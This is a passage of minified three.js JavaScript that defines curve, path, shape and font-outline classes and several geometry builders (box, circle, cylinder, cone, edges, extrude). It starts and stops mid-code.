b=a*this.getLength(),c=this.getCurveLengths(),d=0;d<c.length;){if(c[d]>=b)return a=this.curves[d],b=1-(c[d]-b)/a.getLength(),a.getPointAt(b);d++}return null},getLength:function(){var a=\nthis.getCurveLengths();return a[a.length-1]},updateArcLengths:function(){this.needsUpdate=!0;this.cacheLengths=null;this.getLengths()},getCurveLengths:function(){if(this.cacheLengths&&this.cacheLengths.length===this.curves.length)return this.cacheLengths;for(var a=[],b=0,c=0,d=this.curves.length;c<d;c++)b+=this.curves[c].getLength(),a.push(b);return this.cacheLengths=a},createPointsGeometry:function(a){a=this.getPoints(a);return this.createGeometry(a)},createSpacedPointsGeometry:function(a){a=this.getSpacedPoints(a);\nreturn this.createGeometry(a)},createGeometry:function(a){for(var b=new THREE.Geometry,c=0,d=a.length;c<d;c++){var e=a[c];b.vertices.push(new THREE.Vector3(e.x,e.y,e.z||0))}return b}});THREE.Font=function(a){this.data=a};\nObject.assign(THREE.Font.prototype,{generateShapes:function(a,b,c){void 0===b&&(b=100);void 0===c&&(c=4);var d=this.data;a=String(a).split(\"\");var e=b/d.resolution,f=0;b=[];for(var g=0;g<a.length;g++){var h;h=e;var k=f,l=d.glyphs[a[g]]||d.glyphs[\"?\"];if(l){var n=new THREE.Path,p=[],m=THREE.ShapeUtils.b2,q=THREE.ShapeUtils.b3,r=void 0,s=void 0,t=s=r=void 0,u=void 0,v=void 0,C=void 0,w=void 0,E=void 0,u=void 0;if(l.o)for(var z=l._cachedOutline||(l._cachedOutline=l.o.split(\" \")),y=0,A=z.length;y<A;)switch(z[y++]){case \"m\":r=\nz[y++]*h+k;s=z[y++]*h;n.moveTo(r,s);break;case \"l\":r=z[y++]*h+k;s=z[y++]*h;n.lineTo(r,s);break;case \"q\":r=z[y++]*h+k;s=z[y++]*h;v=z[y++]*h+k;C=z[y++]*h;n.quadraticCurveTo(v,C,r,s);if(u=p[p.length-1])for(var t=u.x,u=u.y,I=1;I<=c;I++){var B=I/c;m(B,t,v,r);m(B,u,C,s)}break;case \"b\":if(r=z[y++]*h+k,s=z[y++]*h,v=z[y++]*h+k,C=z[y++]*h,w=z[y++]*h+k,E=z[y++]*h,n.bezierCurveTo(v,C,w,E,r,s),u=p[p.length-1])for(t=u.x,u=u.y,I=1;I<=c;I++)B=I/c,q(B,t,v,w,r),q(B,u,C,E,s)}h={offset:l.ha*h,path:n}}else h=void 0;f+=\nh.offset;b.push(h.path)}c=[];d=0;for(a=b.length;d<a;d++)Array.prototype.push.apply(c,b[d].toShapes());return c}});THREE.Path=function(a){THREE.CurvePath.call(this);this.actions=[];a&&this.fromPoints(a)};\nTHREE.Path.prototype=Object.assign(Object.create(THREE.CurvePath.prototype),{constructor:THREE.Path,fromPoints:function(a){this.moveTo(a[0].x,a[0].y);for(var b=1,c=a.length;b<c;b++)this.lineTo(a[b].x,a[b].y)},moveTo:function(a,b){this.actions.push({action:\"moveTo\",args:[a,b]})},lineTo:function(a,b){var c=this.actions[this.actions.length-1].args,c=new THREE.LineCurve(new THREE.Vector2(c[c.length-2],c[c.length-1]),new THREE.Vector2(a,b));this.curves.push(c);this.actions.push({action:\"lineTo\",args:[a,\nb]})},quadraticCurveTo:function(a,b,c,d){var e=this.actions[this.actions.length-1].args,e=new THREE.QuadraticBezierCurve(new THREE.Vector2(e[e.length-2],e[e.length-1]),new THREE.Vector2(a,b),new THREE.Vector2(c,d));this.curves.push(e);this.actions.push({action:\"quadraticCurveTo\",args:[a,b,c,d]})},bezierCurveTo:function(a,b,c,d,e,f){var g=this.actions[this.actions.length-1].args,g=new THREE.CubicBezierCurve(new THREE.Vector2(g[g.length-2],g[g.length-1]),new THREE.Vector2(a,b),new THREE.Vector2(c,d),\nnew THREE.Vector2(e,f));this.curves.push(g);this.actions.push({action:\"bezierCurveTo\",args:[a,b,c,d,e,f]})},splineThru:function(a){var b=Array.prototype.slice.call(arguments),c=this.actions[this.actions.length-1].args,c=[new THREE.Vector2(c[c.length-2],c[c.length-1])];Array.prototype.push.apply(c,a);c=new THREE.SplineCurve(c);this.curves.push(c);c=a[a.length-1];b.push(c.x);b.push(c.y);this.actions.push({action:\"splineThru\",args:b})},arc:function(a,b,c,d,e,f){var g=this.actions[this.actions.length-\n1].args;this.absarc(a+g[g.length-2],b+g[g.length-1],c,d,e,f)},absarc:function(a,b,c,d,e,f){this.absellipse(a,b,c,c,d,e,f)},ellipse:function(a,b,c,d,e,f,g,h){var k=this.actions[this.actions.length-1].args;this.absellipse(a+k[k.length-2],b+k[k.length-1],c,d,e,f,g,h)},absellipse:function(a,b,c,d,e,f,g,h){var k=[a,b,c,d,e,f,g,h||0];a=new THREE.EllipseCurve(a,b,c,d,e,f,g,h);this.curves.push(a);a=a.getPoint(1);k.push(a.x);k.push(a.y);this.actions.push({action:\"ellipse\",args:k})},getSpacedPoints:function(a){a||\n(a=40);for(var b=[],c=0;c<a;c++)b.push(this.getPoint(c/a));this.autoClose&&b.push(b[0]);return b},getPoints:function(a){a=a||12;for(var b=THREE.ShapeUtils.b2,c=THREE.ShapeUtils.b3,d=[],e,f,g,h,k,l,n,p,m,q,r=0,s=this.actions.length;r<s;r++){m=this.actions[r];var t=m.args;switch(m.action){case \"moveTo\":d.push(new THREE.Vector2(t[0],t[1]));break;case \"lineTo\":d.push(new THREE.Vector2(t[0],t[1]));break;case \"quadraticCurveTo\":e=t[2];f=t[3];k=t[0];l=t[1];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-\n1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=b(q,n,k,e),q=b(q,p,l,f),d.push(new THREE.Vector2(m,q));break;case \"bezierCurveTo\":e=t[4];f=t[5];k=t[0];l=t[1];g=t[2];h=t[3];0<d.length?(m=d[d.length-1],n=m.x,p=m.y):(m=this.actions[r-1].args,n=m[m.length-2],p=m[m.length-1]);for(t=1;t<=a;t++)q=t/a,m=c(q,n,k,g,e),q=c(q,p,l,h,f),d.push(new THREE.Vector2(m,q));break;case \"splineThru\":m=this.actions[r-1].args;q=[new THREE.Vector2(m[m.length-2],m[m.length-1])];m=a*t[0].length;q=q.concat(t[0]);\nq=new THREE.SplineCurve(q);for(t=1;t<=m;t++)d.push(q.getPointAt(t/m));break;case \"arc\":e=t[0];f=t[1];l=t[2];g=t[3];m=t[4];k=!!t[5];n=m-g;p=2*a;for(t=1;t<=p;t++)q=t/p,k||(q=1-q),q=g+q*n,m=e+l*Math.cos(q),q=f+l*Math.sin(q),d.push(new THREE.Vector2(m,q));break;case \"ellipse\":e=t[0];f=t[1];l=t[2];h=t[3];g=t[4];m=t[5];k=!!t[6];var u=t[7];n=m-g;p=2*a;var v,C;0!==u&&(v=Math.cos(u),C=Math.sin(u));for(t=1;t<=p;t++){q=t/p;k||(q=1-q);q=g+q*n;m=e+l*Math.cos(q);q=f+h*Math.sin(q);if(0!==u){var w=m;m=(w-e)*v-(q-\nf)*C+e;q=(w-e)*C+(q-f)*v+f}d.push(new THREE.Vector2(m,q))}}}a=d[d.length-1];Math.abs(a.x-d[0].x)<Number.EPSILON&&Math.abs(a.y-d[0].y)<Number.EPSILON&&d.splice(d.length-1,1);this.autoClose&&d.push(d[0]);return d},toShapes:function(a,b){function c(a){for(var b=[],c=0,d=a.length;c<d;c++){var e=a[c],f=new THREE.Shape;f.actions=e.actions;f.curves=e.curves;b.push(f)}return b}function d(a,b){for(var c=b.length,d=!1,e=c-1,f=0;f<c;e=f++){var g=b[e],h=b[f],k=h.x-g.x,l=h.y-g.y;if(Math.abs(l)>Number.EPSILON){if(0>\nl&&(g=b[f],k=-k,h=b[e],l=-l),!(a.y<g.y||a.y>h.y))if(a.y===g.y){if(a.x===g.x)return!0}else{e=l*(a.x-g.x)-k*(a.y-g.y);if(0===e)return!0;0>e||(d=!d)}}else if(a.y===g.y&&(h.x<=a.x&&a.x<=g.x||g.x<=a.x&&a.x<=h.x))return!0}return d}var e=THREE.ShapeUtils.isClockWise,f=function(a){for(var b=[],c=new THREE.Path,d=0,e=a.length;d<e;d++){var f=a[d],g=f.args,f=f.action;\"moveTo\"===f&&0!==c.actions.length&&(b.push(c),c=new THREE.Path);c[f].apply(c,g)}0!==c.actions.length&&b.push(c);return b}(this.actions);if(0===\nf.length)return[];if(!0===b)return c(f);var g,h,k,l=[];if(1===f.length)return h=f[0],k=new THREE.Shape,k.actions=h.actions,k.curves=h.curves,l.push(k),l;var n=!e(f[0].getPoints()),n=a?!n:n;k=[];var p=[],m=[],q=0,r;p[q]=void 0;m[q]=[];for(var s=0,t=f.length;s<t;s++)h=f[s],r=h.getPoints(),g=e(r),(g=a?!g:g)?(!n&&p[q]&&q++,p[q]={s:new THREE.Shape,p:r},p[q].s.actions=h.actions,p[q].s.curves=h.curves,n&&q++,m[q]=[]):m[q].push({h:h,p:r[0]});if(!p[0])return c(f);if(1<p.length){s=!1;h=[];e=0;for(f=p.length;e<\nf;e++)k[e]=[];e=0;for(f=p.length;e<f;e++)for(g=m[e],n=0;n<g.length;n++){q=g[n];r=!0;for(t=0;t<p.length;t++)d(q.p,p[t].p)&&(e!==t&&h.push({froms:e,tos:t,hole:n}),r?(r=!1,k[t].push(q)):s=!0);r&&k[e].push(q)}0<h.length&&(s||(m=k))}s=0;for(e=p.length;s<e;s++)for(k=p[s].s,l.push(k),h=m[s],f=0,g=h.length;f<g;f++)k.holes.push(h[f].h);return l}});THREE.Shape=function(){THREE.Path.apply(this,arguments);this.holes=[]};\nTHREE.Shape.prototype=Object.assign(Object.create(THREE.Path.prototype),{constructor:THREE.Shape,extrude:function(a){return new THREE.ExtrudeGeometry(this,a)},makeGeometry:function(a){return new THREE.ShapeGeometry(this,a)},getPointsHoles:function(a){for(var b=[],c=0,d=this.holes.length;c<d;c++)b[c]=this.holes[c].getPoints(a);return b},extractAllPoints:function(a){return{shape:this.getPoints(a),holes:this.getPointsHoles(a)}},extractPoints:function(a){return this.extractAllPoints(a)}});\nTHREE.LineCurve=function(a,b){this.v1=a;this.v2=b};THREE.LineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.LineCurve.prototype.constructor=THREE.LineCurve;THREE.LineCurve.prototype.getPoint=function(a){var b=this.v2.clone().sub(this.v1);b.multiplyScalar(a).add(this.v1);return b};THREE.LineCurve.prototype.getPointAt=function(a){return this.getPoint(a)};THREE.LineCurve.prototype.getTangent=function(a){return this.v2.clone().sub(this.v1).normalize()};\nTHREE.QuadraticBezierCurve=function(a,b,c){this.v0=a;this.v1=b;this.v2=c};THREE.QuadraticBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.QuadraticBezierCurve.prototype.constructor=THREE.QuadraticBezierCurve;THREE.QuadraticBezierCurve.prototype.getPoint=function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))};\nTHREE.QuadraticBezierCurve.prototype.getTangent=function(a){var b=THREE.CurveUtils.tangentQuadraticBezier;return(new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y))).normalize()};THREE.CubicBezierCurve=function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d};THREE.CubicBezierCurve.prototype=Object.create(THREE.Curve.prototype);THREE.CubicBezierCurve.prototype.constructor=THREE.CubicBezierCurve;\nTHREE.CubicBezierCurve.prototype.getPoint=function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))};THREE.CubicBezierCurve.prototype.getTangent=function(a){var b=THREE.CurveUtils.tangentCubicBezier;return(new THREE.Vector2(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y))).normalize()};THREE.SplineCurve=function(a){this.points=void 0==a?[]:a};\nTHREE.SplineCurve.prototype=Object.create(THREE.Curve.prototype);THREE.SplineCurve.prototype.constructor=THREE.SplineCurve;THREE.SplineCurve.prototype.getPoint=function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0===c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector2(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a))};\nTHREE.EllipseCurve=function(a,b,c,d,e,f,g,h){this.aX=a;this.aY=b;this.xRadius=c;this.yRadius=d;this.aStartAngle=e;this.aEndAngle=f;this.aClockwise=g;this.aRotation=h||0};THREE.EllipseCurve.prototype=Object.create(THREE.Curve.prototype);THREE.EllipseCurve.prototype.constructor=THREE.EllipseCurve;\nTHREE.EllipseCurve.prototype.getPoint=function(a){var b=this.aEndAngle-this.aStartAngle;0>b&&(b+=2*Math.PI);b>2*Math.PI&&(b-=2*Math.PI);b=!0===this.aClockwise?this.aEndAngle+(1-a)*(2*Math.PI-b):this.aStartAngle+a*b;a=this.aX+this.xRadius*Math.cos(b);var c=this.aY+this.yRadius*Math.sin(b);if(0!==this.aRotation){var b=Math.cos(this.aRotation),d=Math.sin(this.aRotation),e=a;a=(e-this.aX)*b-(c-this.aY)*d+this.aX;c=(e-this.aX)*d+(c-this.aY)*b+this.aY}return new THREE.Vector2(a,c)};\nTHREE.ArcCurve=function(a,b,c,d,e,f){THREE.EllipseCurve.call(this,a,b,c,c,d,e,f)};THREE.ArcCurve.prototype=Object.create(THREE.EllipseCurve.prototype);THREE.ArcCurve.prototype.constructor=THREE.ArcCurve;THREE.LineCurve3=THREE.Curve.create(function(a,b){this.v1=a;this.v2=b},function(a){var b=new THREE.Vector3;b.subVectors(this.v2,this.v1);b.multiplyScalar(a);b.add(this.v1);return b});\nTHREE.QuadraticBezierCurve3=THREE.Curve.create(function(a,b,c){this.v0=a;this.v1=b;this.v2=c},function(a){var b=THREE.ShapeUtils.b2;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x),b(a,this.v0.y,this.v1.y,this.v2.y),b(a,this.v0.z,this.v1.z,this.v2.z))});\nTHREE.CubicBezierCurve3=THREE.Curve.create(function(a,b,c,d){this.v0=a;this.v1=b;this.v2=c;this.v3=d},function(a){var b=THREE.ShapeUtils.b3;return new THREE.Vector3(b(a,this.v0.x,this.v1.x,this.v2.x,this.v3.x),b(a,this.v0.y,this.v1.y,this.v2.y,this.v3.y),b(a,this.v0.z,this.v1.z,this.v2.z,this.v3.z))});\nTHREE.SplineCurve3=THREE.Curve.create(function(a){console.warn(\"THREE.SplineCurve3 will be deprecated. Please use THREE.CatmullRomCurve3\");this.points=void 0==a?[]:a},function(a){var b=this.points;a*=b.length-1;var c=Math.floor(a);a-=c;var d=b[0==c?c:c-1],e=b[c],f=b[c>b.length-2?b.length-1:c+1],b=b[c>b.length-3?b.length-1:c+2],c=THREE.CurveUtils.interpolate;return new THREE.Vector3(c(d.x,e.x,f.x,b.x,a),c(d.y,e.y,f.y,b.y,a),c(d.z,e.z,f.z,b.z,a))});\nTHREE.CatmullRomCurve3=function(){function a(){}var b=new THREE.Vector3,c=new a,d=new a,e=new a;a.prototype.init=function(a,b,c,d){this.c0=a;this.c1=c;this.c2=-3*a+3*b-2*c-d;this.c3=2*a-2*b+c+d};a.prototype.initNonuniformCatmullRom=function(a,b,c,d,e,n,p){a=((b-a)/e-(c-a)/(e+n)+(c-b)/n)*n;d=((c-b)/n-(d-b)/(n+p)+(d-c)/p)*n;this.init(b,c,a,d)};a.prototype.initCatmullRom=function(a,b,c,d,e){this.init(b,c,e*(c-a),e*(d-b))};a.prototype.calc=function(a){var b=a*a;return this.c0+this.c1*a+this.c2*b+this.c3*\nb*a};return THREE.Curve.create(function(a){this.points=a||[];this.closed=!1},function(a){var g=this.points,h,k;k=g.length;2>k&&console.log(\"duh, you need at least 2 points\");a*=k-(this.closed?0:1);h=Math.floor(a);a-=h;this.closed?h+=0<h?0:(Math.floor(Math.abs(h)/g.length)+1)*g.length:0===a&&h===k-1&&(h=k-2,a=1);var l,n,p;this.closed||0<h?l=g[(h-1)%k]:(b.subVectors(g[0],g[1]).add(g[0]),l=b);n=g[h%k];p=g[(h+1)%k];this.closed||h+2<k?g=g[(h+2)%k]:(b.subVectors(g[k-1],g[k-2]).add(g[k-1]),g=b);if(void 0===\nthis.type||\"centripetal\"===this.type||\"chordal\"===this.type){var m=\"chordal\"===this.type?.5:.25;k=Math.pow(l.distanceToSquared(n),m);h=Math.pow(n.distanceToSquared(p),m);m=Math.pow(p.distanceToSquared(g),m);1E-4>h&&(h=1);1E-4>k&&(k=h);1E-4>m&&(m=h);c.initNonuniformCatmullRom(l.x,n.x,p.x,g.x,k,h,m);d.initNonuniformCatmullRom(l.y,n.y,p.y,g.y,k,h,m);e.initNonuniformCatmullRom(l.z,n.z,p.z,g.z,k,h,m)}else\"catmullrom\"===this.type&&(k=void 0!==this.tension?this.tension:.5,c.initCatmullRom(l.x,n.x,p.x,g.x,\nk),d.initCatmullRom(l.y,n.y,p.y,g.y,k),e.initCatmullRom(l.z,n.z,p.z,g.z,k));return new THREE.Vector3(c.calc(a),d.calc(a),e.calc(a))})}();THREE.ClosedSplineCurve3=function(a){console.warn(\"THREE.ClosedSplineCurve3 has been deprecated. Please use THREE.CatmullRomCurve3.\");THREE.CatmullRomCurve3.call(this,a);this.type=\"catmullrom\";this.closed=!0};THREE.ClosedSplineCurve3.prototype=Object.create(THREE.CatmullRomCurve3.prototype);\nTHREE.BoxGeometry=function(a,b,c,d,e,f){THREE.Geometry.call(this);this.type=\"BoxGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};this.fromBufferGeometry(new THREE.BoxBufferGeometry(a,b,c,d,e,f));this.mergeVertices()};THREE.BoxGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.BoxGeometry.prototype.constructor=THREE.BoxGeometry;THREE.CubeGeometry=THREE.BoxGeometry;\nTHREE.BoxBufferGeometry=function(a,b,c,d,e,f){function g(a,b,c,d,e,f,g,k,l,K,P){var M=f/l,H=g/K,L=f/2,O=g/2,N=k/2;g=l+1;for(var Q=K+1,J=f=0,D=new THREE.Vector3,G=0;G<Q;G++)for(var aa=G*H-O,T=0;T<g;T++)D[a]=(T*M-L)*d,D[b]=aa*e,D[c]=N,p[r]=D.x,p[r+1]=D.y,p[r+2]=D.z,D[a]=0,D[b]=0,D[c]=0<k?1:-1,m[r]=D.x,m[r+1]=D.y,m[r+2]=D.z,q[s]=T/l,q[s+1]=1-G/K,r+=3,s+=2,f+=1;for(G=0;G<K;G++)for(T=0;T<l;T++)a=u+T+g*(G+1),b=u+(T+1)+g*(G+1),c=u+(T+1)+g*G,n[t]=u+T+g*G,n[t+1]=a,n[t+2]=c,n[t+3]=a,n[t+4]=b,n[t+5]=c,t+=6,\nJ+=6;h.addGroup(v,J,P);v+=J;u+=f}THREE.BufferGeometry.call(this);this.type=\"BoxBufferGeometry\";this.parameters={width:a,height:b,depth:c,widthSegments:d,heightSegments:e,depthSegments:f};var h=this;d=Math.floor(d)||1;e=Math.floor(e)||1;f=Math.floor(f)||1;var k=function(a,b,c){a=0+(a+1)*(b+1)*2+(a+1)*(c+1)*2;return a+=(c+1)*(b+1)*2}(d,e,f),l=function(a,b,c){a=0+a*b*2+a*c*2;a+=c*b*2;return 6*a}(d,e,f),n=new (65535<l?Uint32Array:Uint16Array)(l),p=new Float32Array(3*k),m=new Float32Array(3*k),q=new Float32Array(2*\nk),r=0,s=0,t=0,u=0,v=0;g(\"z\",\"y\",\"x\",-1,-1,c,b,a,f,e,0);g(\"z\",\"y\",\"x\",1,-1,c,b,-a,f,e,1);g(\"x\",\"z\",\"y\",1,1,a,c,b,d,f,2);g(\"x\",\"z\",\"y\",1,-1,a,c,-b,d,f,3);g(\"x\",\"y\",\"z\",1,-1,a,b,c,d,e,4);g(\"x\",\"y\",\"z\",-1,-1,a,b,-c,d,e,5);this.setIndex(new THREE.BufferAttribute(n,1));this.addAttribute(\"position\",new THREE.BufferAttribute(p,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(m,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(q,2))};THREE.BoxBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);\nTHREE.BoxBufferGeometry.prototype.constructor=THREE.BoxBufferGeometry;THREE.CircleGeometry=function(a,b,c,d){THREE.Geometry.call(this);this.type=\"CircleGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};this.fromBufferGeometry(new THREE.CircleBufferGeometry(a,b,c,d))};THREE.CircleGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.CircleGeometry.prototype.constructor=THREE.CircleGeometry;\nTHREE.CircleBufferGeometry=function(a,b,c,d){THREE.BufferGeometry.call(this);this.type=\"CircleBufferGeometry\";this.parameters={radius:a,segments:b,thetaStart:c,thetaLength:d};a=a||50;b=void 0!==b?Math.max(3,b):8;c=void 0!==c?c:0;d=void 0!==d?d:2*Math.PI;var e=b+2,f=new Float32Array(3*e),g=new Float32Array(3*e),e=new Float32Array(2*e);g[2]=1;e[0]=.5;e[1]=.5;for(var h=0,k=3,l=2;h<=b;h++,k+=3,l+=2){var n=c+h/b*d;f[k]=a*Math.cos(n);f[k+1]=a*Math.sin(n);g[k+2]=1;e[l]=(f[k]/a+1)/2;e[l+1]=(f[k+1]/a+1)/2}c=\n[];for(k=1;k<=b;k++)c.push(k,k+1,0);this.setIndex(new THREE.BufferAttribute(new Uint16Array(c),1));this.addAttribute(\"position\",new THREE.BufferAttribute(f,3));this.addAttribute(\"normal\",new THREE.BufferAttribute(g,3));this.addAttribute(\"uv\",new THREE.BufferAttribute(e,2));this.boundingSphere=new THREE.Sphere(new THREE.Vector3,a)};THREE.CircleBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.CircleBufferGeometry.prototype.constructor=THREE.CircleBufferGeometry;\nTHREE.CylinderBufferGeometry=function(a,b,c,d,e,f,g,h){function k(c){var e,f,k,m=new THREE.Vector2,n=new THREE.Vector3,p=0,C=!0===c?a:b,M=!0===c?1:-1;f=u;for(e=1;e<=d;e++)r.setXYZ(u,0,w*M,0),s.setXYZ(u,0,M,0),m.x=.5,m.y=.5,t.setXY(u,m.x,m.y),u++;k=u;for(e=0;e<=d;e++){var H=e/d*h+g,L=Math.cos(H),H=Math.sin(H);n.x=C*H;n.y=w*M;n.z=C*L;r.setXYZ(u,n.x,n.y,n.z);s.setXYZ(u,0,M,0);m.x=.5*L+.5;m.y=.5*H*M+.5;t.setXY(u,m.x,m.y);u++}for(e=0;e<d;e++)m=f+e,n=k+e,!0===c?(q.setX(v,n),v++,q.setX(v,n+1)):(q.setX(v,\nn+1),v++,q.setX(v,n)),v++,q.setX(v,m),v++,p+=3;l.addGroup(E,p,!0===c?1:2);E+=p}THREE.BufferGeometry.call(this);this.type=\"CylinderBufferGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};var l=this;a=void 0!==a?a:20;b=void 0!==b?b:20;c=void 0!==c?c:100;d=Math.floor(d)||8;e=Math.floor(e)||1;f=void 0!==f?f:!1;g=void 0!==g?g:0;h=void 0!==h?h:2*Math.PI;var n=0;!1===f&&(0<a&&n++,0<b&&n++);var p=function(){var a=(d+1)*\n(e+1);!1===f&&(a+=(d+1)*n+d*n);return a}(),m=function(){var a=d*e*6;!1===f&&(a+=d*n*3);return a}(),q=new THREE.BufferAttribute(new (65535<m?Uint32Array:Uint16Array)(m),1),r=new THREE.BufferAttribute(new Float32Array(3*p),3),s=new THREE.BufferAttribute(new Float32Array(3*p),3),t=new THREE.BufferAttribute(new Float32Array(2*p),2),u=0,v=0,C=[],w=c/2,E=0;(function(){var f,k,m=new THREE.Vector3,n=new THREE.Vector3,p=0,F=(b-a)/c;for(k=0;k<=e;k++){var K=[],P=k/e,M=P*(b-a)+a;for(f=0;f<=d;f++){var H=f/d;n.x=\nM*Math.sin(H*h+g);n.y=-P*c+w;n.z=M*Math.cos(H*h+g);r.setXYZ(u,n.x,n.y,n.z);m.copy(n);if(0===a&&0===k||0===b&&k===e)m.x=Math.sin(H*h+g),m.z=Math.cos(H*h+g);m.setY(Math.sqrt(m.x*m.x+m.z*m.z)*F).normalize();s.setXYZ(u,m.x,m.y,m.z);t.setXY(u,H,1-P);K.push(u);u++}C.push(K)}for(f=0;f<d;f++)for(k=0;k<e;k++)m=C[k+1][f],n=C[k+1][f+1],F=C[k][f+1],q.setX(v,C[k][f]),v++,q.setX(v,m),v++,q.setX(v,F),v++,q.setX(v,m),v++,q.setX(v,n),v++,q.setX(v,F),v++,p+=6;l.addGroup(E,p,0);E+=p})();!1===f&&(0<a&&k(!0),0<b&&k(!1));\nthis.setIndex(q);this.addAttribute(\"position\",r);this.addAttribute(\"normal\",s);this.addAttribute(\"uv\",t)};THREE.CylinderBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.CylinderBufferGeometry.prototype.constructor=THREE.CylinderBufferGeometry;\nTHREE.CylinderGeometry=function(a,b,c,d,e,f,g,h){THREE.Geometry.call(this);this.type=\"CylinderGeometry\";this.parameters={radiusTop:a,radiusBottom:b,height:c,radialSegments:d,heightSegments:e,openEnded:f,thetaStart:g,thetaLength:h};this.fromBufferGeometry(new THREE.CylinderBufferGeometry(a,b,c,d,e,f,g,h));this.mergeVertices()};THREE.CylinderGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.CylinderGeometry.prototype.constructor=THREE.CylinderGeometry;\nTHREE.ConeBufferGeometry=function(a,b,c,d,e,f,g){THREE.CylinderBufferGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeBufferGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,thetaStart:f,thetaLength:g}};THREE.ConeBufferGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.ConeBufferGeometry.prototype.constructor=THREE.ConeBufferGeometry;\nTHREE.ConeGeometry=function(a,b,c,d,e,f,g){THREE.CylinderGeometry.call(this,0,a,b,c,d,e,f,g);this.type=\"ConeGeometry\";this.parameters={radius:a,height:b,radialSegments:c,heightSegments:d,openEnded:e,thetaStart:f,thetaLength:g}};THREE.ConeGeometry.prototype=Object.create(THREE.CylinderGeometry.prototype);THREE.ConeGeometry.prototype.constructor=THREE.ConeGeometry;\nTHREE.EdgesGeometry=function(a,b){function c(a,b){return a-b}THREE.BufferGeometry.call(this);var d=Math.cos(THREE.Math.DEG2RAD*(void 0!==b?b:1)),e=[0,0],f={},g=[\"a\",\"b\",\"c\"],h;a instanceof THREE.BufferGeometry?(h=new THREE.Geometry,h.fromBufferGeometry(a)):h=a.clone();h.mergeVertices();h.computeFaceNormals();var k=h.vertices;h=h.faces;for(var l=0,n=h.length;l<n;l++)for(var p=h[l],m=0;3>m;m++){e[0]=p[g[m]];e[1]=p[g[(m+1)%3]];e.sort(c);var q=e.toString();void 0===f[q]?f[q]={vert1:e[0],vert2:e[1],face1:l,\nface2:void 0}:f[q].face2=l}e=[];for(q in f)if(g=f[q],void 0===g.face2||h[g.face1].normal.dot(h[g.face2].normal)<=d)l=k[g.vert1],e.push(l.x),e.push(l.y),e.push(l.z),l=k[g.vert2],e.push(l.x),e.push(l.y),e.push(l.z);this.addAttribute(\"position\",new THREE.BufferAttribute(new Float32Array(e),3))};THREE.EdgesGeometry.prototype=Object.create(THREE.BufferGeometry.prototype);THREE.EdgesGeometry.prototype.constructor=THREE.EdgesGeometry;\nTHREE.ExtrudeGeometry=function(a,b){\"undefined\"!==typeof a&&(THREE.Geometry.call(this),this.type=\"ExtrudeGeometry\",a=Array.isArray(a)?a:[a],this.addShapeList(a,b),this.computeFaceNormals())};THREE.ExtrudeGeometry.prototype=Object.create(THREE.Geometry.prototype);THREE.ExtrudeGeometry.prototype.constructor=THREE.ExtrudeGeometry;THREE.ExtrudeGeometry.prototype.addShapeList=function(a,b){for(var c=a.length,d=0;d<c;d++)this.addShape(a[d],b)};\nTHREE.ExtrudeGeometry.prototype.addShape=function(a,b){function c(a,b,c){b||console.error(\"THREE.ExtrudeGeometry: vec does not exist\");return b.clone().multiplyScalar(c).add(a)}function d(a,b,c){var d=1,d=a.x-b.x,e=a.y-b.y,f=c.x-a.x,g=c.y-a.y,h=d*d+e*e;if(Math.abs(d*g-e*f)>Number.EPSILON){var k=Math.sqrt(h),l=Math.sqrt(f*f+g*g),h=b.x-e/k;b=b.y+d/k;f=((c.x-g/l-h)*g-(c.y+f/l-b)*f)/(d*g-e*f);c=h+d*f-a.x;a=b+e*f-a.y;d=c*c+a*a;if(2>=d)return new THREE.Vector2(c,a);d=Math.sqrt(d/2)}else a=!1,d>Number.EPSILON?\nf>Number.EPSILON&&(a=!0):d<-Number.EPSILON?f<-Number.EPSILON&&(a=!0):Math.sign(e)===Math.sign(g)&&(a=!0),a?(c=-e,a=d,d=Math.sqrt(h)):(c=d,a=e,d=Math.sqrt(h/2));return new THREE.Vector2(c/d,a/d)}function e(a,b){var c,d;for(G=a.length;0<=--G;){c=G;d=G-1;0>d&&(d=a.length-1);for(var e=0,f=q+2*n,e=0;e<f;e++){var g=Q*e,h=Q*(e+1),k=b+c+g,g=b+d+g,l=b+d+h,h=b+c+h,k=k+B,g=g+B,l=l+B,h=h+B;I.faces.push(new THREE.Face3(k,g,h,null,null,1));I.faces.push(new 